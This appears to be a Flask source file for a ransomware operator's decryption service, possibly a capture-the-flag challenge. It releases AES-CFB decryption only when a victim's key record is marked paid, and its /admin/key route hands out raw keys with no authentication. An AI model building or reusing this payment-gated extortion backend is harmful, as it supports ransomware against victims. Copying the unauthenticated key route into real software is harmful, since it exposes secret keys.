import os
import json
import string
import binascii

from flask import Flask, Blueprint, request, jsonify, render_template, abort
from Crypto.Cipher import AES

app = Flask(__name__)

def get_info():
    key = request.headers.get('key_id')
    if not key:
        abort(400, 'Missing key id')
    if not all(c in '0123456789ABCDEFabcdef'
            for c in key):
        abort(400, 'Invalid key id format')
    path = os.path.join('/server/keys',key)
    if not os.path.exists(path):
        abort(401, 'Unknown encryption key id')
    with open(path,'r') as f:
        return json.load(f)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/decrypt', methods=['POST'])
def decrypt():
    info = get_info()
    if not info.get('paid', False):
        abort(403, 'Ransom has not been paid')

    key = binascii.unhexlify(info['key'])
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)

@app.route('/admin/key')
def get_key():
    return jsonify(key=get_info()['key'])
